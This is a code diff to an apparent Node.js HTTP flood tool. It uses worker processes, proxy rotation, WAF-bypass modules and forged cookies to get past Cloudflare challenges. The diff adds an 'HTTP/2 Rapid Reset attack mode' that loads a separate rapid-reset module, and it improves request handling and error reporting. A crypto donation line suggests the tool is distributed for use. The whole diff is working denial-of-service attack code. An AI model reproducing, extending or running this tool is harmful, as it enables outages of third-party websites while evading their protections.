@@ -20,7 +20,6 @@ const bypassTechniques = require('./bypass-techniques.js');
 const wafBypassTechniques = require('./waf-bypass.js');
 const networkDetector = require('./network-detector.js');
 const { performance } = require('perf_hooks');
-const http2Wrapper = require('http2-wrapper');
 
 // Immediately check if this is a worker process and suppress output
 if (cluster.isWorker) {
@@ -39,13 +38,6 @@ const parseNum = (value, fallback) => {
   return isNaN(parsed) ? fallback : parsed;
 };
 
-// Parse function for boolean parameters
-const parseBool = (value) => {
-  if (typeof value === 'boolean') return value;
-  if (value === undefined || value === null) return false;
-  return value === 'true' || value === '1';
-};
-
 // Parse command line options
 program
   .version('1.0.0')
@@ -58,22 +50,23 @@ program
   .option('-r, --rate <number>', 'Requests per second per worker', parseNum, 50)
   .option('-b, --bypass <techniques>', 'Comma-separated list of bypass techniques', 'all')
   .option('--headers <headers>', 'Custom headers in JSON format')
-  .option('--verbose', 'Enable verbose output', parseBool, false)
+  .option('--verbose', 'Enable verbose output', false)
   .option('--delay <ms>', 'Delay between requests in ms', parseNum, 0)
   .option('--proxy <proxy>', 'Use proxy (format: host:port)')
   .option('--proxy-file <file>', 'Load proxies from file (format: host:port per line)')
   .option('--log <file>', 'Log results to file')
-  .option('--keep-alive', 'Use HTTP keep-alive', parseBool, false)
-  .option('--randomize-path', 'Add random path segments to URL', parseBool, false)
-  .option('--auto-detect', 'Auto-detect best bypass techniques for target', parseBool, false)
+  .option('--keep-alive', 'Use HTTP keep-alive', false)
+  .option('--randomize-path', 'Add random path segments to URL', false)
+  .option('--auto-detect', 'Auto-detect best bypass techniques for target', false)
   .option('--timeout <ms>', 'Request timeout in milliseconds', parseNum, 10000)
-  .option('--follow-redirects', 'Follow HTTP redirects', parseBool, false)
+  .option('--follow-redirects', 'Follow HTTP redirects', false)
   .option('--max-redirects <number>', 'Maximum number of redirects to follow', parseNum, 5)
-  .option('--no-warnings', 'Suppress TLS warnings', parseBool, false)
+  .option('--no-warnings', 'Suppress TLS warnings', false)
   .option('--protocol <protocol>', 'HTTP protocol to use (http1.0, http1.1, http2)', 'http1.1')
-  .option('--quiet', 'Suppress worker output and warnings', parseBool, false)
-  .option('--no-banner', 'Do not display ASCII banner', parseBool, false)
-  .option('--silent', 'Only show final results', parseBool, false)
+  .option('--rapid-reset', 'Enable HTTP/2 Rapid Reset attack mode. This will ignore some other options.', false)
+  .option('--quiet', 'Suppress worker output and warnings', false)
+  .option('--no-banner', 'Do not display ASCII banner', false)
+  .option('--silent', 'Only show final results', false)
   .parse(process.argv);
 
 const options = program.opts();
@@ -452,6 +445,9 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
           for (const code in msg.data.statusCodes) {
             stats.statusCodes[code] = (stats.statusCodes[code] || 0) + msg.data.statusCodes[code];
           }
+        } else if (msg.type === 'error') {
+            console.error(`[WORKER_ERROR] Message: ${msg.data.message}`);
+            console.error(`[WORKER_ERROR] Stack: ${msg.data.stack}`);
         } else if (msg.type === 'completed') {
           completedWorkers++;
           activeWorkers--;
@@ -763,6 +759,17 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
   
   // Wait for initial config message before starting requests
   const startRequestInterval = () => {
+    if (!options.duration) { // A proxy for "config received"
+        setTimeout(startRequestInterval, 100);
+        return;
+    }
+
+    if (options.rapidReset) {
+        const { launch } = require('./rapid-reset.js');
+        launch(options, workerStats);
+        return;
+    }
+
     if (bypassOptions.length === 0) {
       setTimeout(startRequestInterval, 100);
       return;
@@ -1077,11 +1084,12 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
   }
 
   // Update the main performRequest function to handle HTTP/2 failures properly
-  function performRequest() {
+  function performRequest(targetUrl) {
     try {
+      const urlToUse = targetUrl || options.target;
       // Parse the URL
-      const parsedUrl = new URL(options.target);
-      const requestOptions = createRequestOptions();
+      const parsedUrl = new URL(urlToUse);
+      const requestOptions = createRequestOptions(urlToUse);
       
       // Generate necessary tokens and cookies for Cloudflare bypass
       const timestamp = Date.now();
@@ -1097,7 +1105,7 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
       ];
       
       // Add the cookies to the request
-      requestOptions.headers['Cookie'] = cookies.join('; ');
+      requestOptions.headers['Cookie'] = (requestOptions.headers['Cookie'] || '') + (requestOptions.headers['Cookie'] ? '; ' : '') + cookies.join('; ');
       
       // Choose the appropriate protocol implementation - STRICTLY based on options.protocol
       if (options.protocol === 'http2') {
@@ -1120,18 +1128,19 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
   // Extract HTTP/1.x implementation to a separate function
   function performHttp1Request(parsedUrl, requestOptions) {
     try {
+      if (options.verbose) console.log('Performing HTTP/1.x request...');
       const protocol = parsedUrl.protocol === 'https:' ? https : http;
       
       // Set HTTP version based on protocol option
       requestOptions.protocol = parsedUrl.protocol;
       if (options.protocol === 'http1.0') {
-        // Force HTTP/1.0
-        requestOptions.headers['Connection'] = 'close'; // Always close for HTTP/1.0
-        requestOptions._defaultAgent = null; // Will be set by the request
+        if (options.verbose) console.log('Setting up for HTTP/1.0...');
+        requestOptions.headers['Connection'] = 'close';
+        requestOptions._defaultAgent = null;
         requestOptions.httpVersionMajor = 1;
         requestOptions.httpVersionMinor = 0;
       } else {
-        // HTTP/1.1 (default)
+        if (options.verbose) console.log('Setting up for HTTP/1.1...');
         requestOptions.httpVersionMajor = 1;
         requestOptions.httpVersionMinor = 1;
         if (options.keepAlive) {
@@ -1141,13 +1150,11 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
         }
       }
       
-      // Handle proxy for HTTP/1.x
+      if (options.verbose) console.log('Checking for proxy...');
       const proxyToUse = options.proxy || getNextProxy();
       if (proxyToUse) {
-        // Extract proxy parts
+        if (options.verbose) console.log(`Using proxy: ${proxyToUse}`);
         const [proxyHost, proxyPort] = proxyToUse.split(':');
-        
-        // Extract auth if provided
         let proxyAuth = null;
         let actualProxyHost = proxyHost;
         
@@ -1158,7 +1165,7 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
         }
         
         if (parsedUrl.protocol === 'https:') {
-          // For HTTPS, use tunnel agent
+          if (options.verbose) console.log('Setting up HTTPS-over-HTTP tunnel agent...');
           requestOptions.agent = tunnel.httpsOverHttp({
             proxy: {
               host: actualProxyHost,
@@ -1168,7 +1175,7 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
             rejectUnauthorized: false
           });
         } else {
-          // For HTTP, use direct proxy
+          if (options.verbose) console.log('Setting up direct HTTP proxy...');
           requestOptions.hostname = actualProxyHost;
           requestOptions.port = parseInt(proxyPort, 10);
           requestOptions.path = parsedUrl.href;
@@ -1179,18 +1186,11 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
         }
       }
       
-      // Add tracing for verbose mode
-      if (options.verbose) {
-        console.log(`Making HTTP/1.${options.protocol === 'http1.0' ? '0' : '1'} request to ${parsedUrl.href}`);
-      }
-      
-      // Make the HTTP/1.x request
+      if (options.verbose) console.log(`Making HTTP/1.${options.protocol === 'http1.0' ? '0' : '1'} request to ${parsedUrl.href}...`);
       const request = protocol.request(requestOptions, (response) => {
-        // Track status code
         const statusCode = response.statusCode;
         workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
         
-        // Check for Cloudflare challenge
         const isCloudflareCaptcha = response.headers['server'] === 'cloudflare' && 
                                    (statusCode === 403 || statusCode === 503) &&
                                    (response.headers['cf-chl-bypass'] || response.headers['cf-ray']);
@@ -1199,19 +1199,17 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
           workerStats.statusCodes['cf_challenge'] = (workerStats.statusCodes['cf_challenge'] || 0) + 1;
         }
         
-        // Track success/failure
         if (statusCode >= 200 && statusCode < 400) {
           workerStats.successful++;
         } else {
           workerStats.failed++;
         }
         
-        // Handle redirects if enabled
         if (options.followRedirects && [301, 302, 303, 307, 308].includes(statusCode)) {
           const location = response.headers.location;
           if (location) {
             try {
-              const redirectUrl = new URL(location, options.target);
+              const redirectUrl = new URL(location, parsedUrl.href);
               if (options.verbose) {
                 console.log(`Following redirect to: ${redirectUrl.href}`);
               }
@@ -1222,13 +1220,11 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
               }
               workerStats.failed++;
             }
-            // Count the original request
             workerStats.requests++;
             return;
           }
         }
         
-        // Collect response data
         let responseData = Buffer.alloc(0);
         response.on('data', (chunk) => {
           responseData = Buffer.concat([responseData, chunk]);
@@ -1238,10 +1234,11 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
         response.on('end', () => {
           workerStats.requests++;
           
-          // Check if we got back any cookies
-          const setCookieHeader = response.headers['set-cookie'];
-          if (setCookieHeader && options.verbose) {
-            console.log(`Received cookies: ${setCookieHeader}`);
+          if (options.verbose) {
+            const setCookieHeader = response.headers['set-cookie'];
+            if (setCookieHeader) {
+              console.log(`Received cookies: ${setCookieHeader}`);
+            }
           }
         });
       });
@@ -1255,7 +1252,6 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
         workerStats.statusCodes[`http1_error`] = (workerStats.statusCodes[`http1_error`] || 0) + 1;
       });
       
-      // Set timeout
       request.setTimeout(options.timeout || 10000, () => {
         request.destroy();
         workerStats.failed++;
@@ -1263,7 +1259,6 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
         workerStats.statusCodes['timeout'] = (workerStats.statusCodes['timeout'] || 0) + 1;
       });
       
-      // Send payload if applicable
       if (['POST', 'PUT', 'PATCH'].includes(options.method)) {
         if (payloadData) {
           const buffer = Buffer.from(payloadData);
@@ -1277,11 +1272,11 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
         }
       }
       
+      if (options.verbose) console.log('Ending request...');
       request.end();
+      if (options.verbose) console.log('Request ended.');
     } catch (error) {
-      if (options.verbose) {
-        console.error(`HTTP/1.${options.protocol === 'http1.0' ? '0' : '1'} error: ${error.message}`);
-      }
+      process.send({ type: 'error', data: { message: error.message, stack: error.stack } });
       workerStats.failed++;
       workerStats.requests++;
       workerStats.statusCodes[`http1_setup_error`] = (workerStats.statusCodes[`http1_setup_error`] || 0) + 1;
